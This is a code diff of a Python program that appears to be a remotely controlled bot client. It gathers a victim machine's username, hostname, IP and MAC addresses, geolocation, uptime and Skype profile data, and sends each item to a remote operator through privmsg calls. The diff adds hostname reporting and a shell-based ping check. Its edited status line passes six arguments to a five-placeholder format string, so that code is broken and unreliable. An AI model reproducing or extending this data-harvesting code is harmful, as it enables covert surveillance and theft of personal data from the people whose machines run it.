@@ -244,7 +244,7 @@ def identify():                                                                 
     log('[>]    Public:  ',public_ip)
     mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
     log('[>]    MAC:     ',mac_addr)
-    return "[v%s/x%s] %s l: %s p: %s MAC: %s" % (version, system.strip(), (main_user[:14]+"@"+hostname[:14]).ljust(30), local_ip.ljust(15), public_ip.ljust(15), mac_addr)
+    return "[v%s/x%s] %s l: %s p: %s MAC: %s" % (version, system.strip(), (main_user[:14]+"@"+hostname[:13]).ljust(30), local_ip.ljust(15), public_ip.ljust(15), mac_addr)
  
 def full_identify():                                                            # give verbose identifying info about the host computer
     log('[+] Running v%s Identification Modules...' % version)
@@ -252,17 +252,20 @@ def full_identify():                                                            
     system = platform.mac_ver()[0]
     if len(str(system)) < 1:
         system = platform.platform()
-        log('[>]    System:    ',system)
+        log('[>]    System:    ', system)
         privmsg('[>]      System:    %s' % system)
     else:
-        log('[>]    OS X:    ',system)
+        log('[>]    OS X:    ', system)
         privmsg('[>]      OS X:    %s' % system)
 
-    log('[>]    Bot:    ',local_user)
+    log('[>]    Bot:    ', local_user)
     privmsg('[>]      Bot:    %s' % local_user)
 
-    log('[>]    User:    ',main_user)
+    log('[>]    User:    ', main_user)
     privmsg('[>]      User:    %s' % main_user)
+
+    log('[>]    Host:    ', hostname)
+    privmsg('[>]      Host:    %s' % hostname)
 
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
@@ -271,33 +274,33 @@ def full_identify():                                                            
         s.close()
     except Exception as ip_error:
         local_ip = ip_error
-    log('[>]    Local:   ',local_ip)
+    log('[>]    Local:   ', local_ip)
     privmsg('[>]      Local:   %s' % local_ip)
     try:
         public_ip = urllib2.urlopen('http://checkip.dyndns.org:8245/').read().split(": ")[1].split("<")[0].strip()
     except Exception as url_error:
         public_ip = url_error
-    log('[>]    Public:  ',public_ip)
+    log('[>]    Public:  ', public_ip)
     privmsg('[>]      Public:  %s' % public_ip)
     
     mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
-    log('[>]    MAC:     ',mac_addr)
+    log('[>]    MAC:     ', mac_addr)
     privmsg('[>]      MAC:     %s' % mac_addr)
     
     cmd = "system_profiler SPPowerDataType | grep Connected"
     for line in run_shell(cmd):
-        log('[>]    Power:    ',line)
+        log('[>]    Power:    ', line)
         privmsg('[>]      Power:    %s' % line)
     
     cmd = "uptime"
     for line in run_shell(cmd):
-        log('[>]    UP:    ',line)
+        log('[>]    UP:    ', line)
         privmsg('[>]      Up:    %s' % line)
 
     geo_info = geo_locate()
     location = geo_info[0]+", "+geo_info[1]+" ("+str(geo_info[4])+", "+str(geo_info[5])+")"
 
-    log('[>]    Geoip:    ',location)
+    log('[>]    Geoip:    ', location)
     privmsg('[>]      Location:    %s' % location)
 
     try:
@@ -305,7 +308,7 @@ def full_identify():                                                            
         log('[>]    Skype:    ')
         privmsg('[>]      Skype:')
         for line in skype.skypeProfile(db_path):
-            log('[>]              ',line)
+            log('[>]              ', line)
             privmsg('[>]         %s' % line)
             sleep(1)
     except:
@@ -465,7 +468,14 @@ def selfupdate(git_user="nikisweeting",git_repo="python-medusa"):               
 def status_report(connection_time, timeout_count, last_ping):
     ping = round(time.time() - last_ping, 1)
     connected = round(time.time() - connection_time, 1)
-    return "[v%s] connected[%ss] net_errors[%s] last_ping[%ss ago] host[%s@%s]" % (version, connected, timeout_count, ping, main_user, hostname)
+
+    cmd = "ping -q -c2 google.com | tail -1 | awk '{print $4}' | cut -d '/' -f 2"
+    try:
+        ping_speed = os.popen(cmd).read().strip()
+    except Exception as ping_error:
+        ping_speed = ping_error
+
+    return "[v%s] connected[%ss] net_errors[%s] last_ping[%ss ago] ping[%s]" % (version, connected, timeout_count, ping, main_user, ping_speed)
 
 def admin(admins):
     for entry in admins:
